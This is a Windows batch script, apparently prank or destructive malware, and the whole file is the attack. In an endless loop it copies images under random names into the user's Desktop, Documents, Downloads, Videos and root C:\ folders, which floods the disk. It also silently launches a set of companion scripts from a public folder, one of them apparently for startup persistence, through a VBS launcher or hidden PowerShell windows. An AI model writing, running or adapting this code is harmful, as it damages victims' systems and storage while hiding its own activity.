@echo off

setlocal
set "vbsFile=%PUBLIC%\vbs\file.vbs"

:loop

powershell cp %TEMP%\image.png $env:USERPROFILE\Desktop\%random%1.png
powershell cp %TEMP%\image2.jpg $env:USERPROFILE\Documents\%random%3.jpg
powershell cp %TEMP%\image3.jpg $env:USERPROFILE\Downloads\%random%2.jpg
powershell cp %TEMP%\image.png $env:USERPROFILE\Videos\%random%1.png
powershell cp %TEMP%\image.png C:\%random%1.png
powershell cp %TEMP%\image3.png C:\%random%1.png
powershell cp %TEMP%\image2.png C:\%random%1.png
powershell cp %TEMP%\image3.png C:\Users\%random%1.png
powershell cp %TEMP%\image2.png %TEMP%\%random%1.png

if exist "%vbsFile%" (
    wscript "%vbsFile%" "%PUBLIC%\sigma\filel.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\file.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\sigma.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\copy.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\startup.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\lulz.bat"
) else (
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\file.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\sigma.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\copy.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\startup.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\filel.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\lulz.bat"
)
goto loop
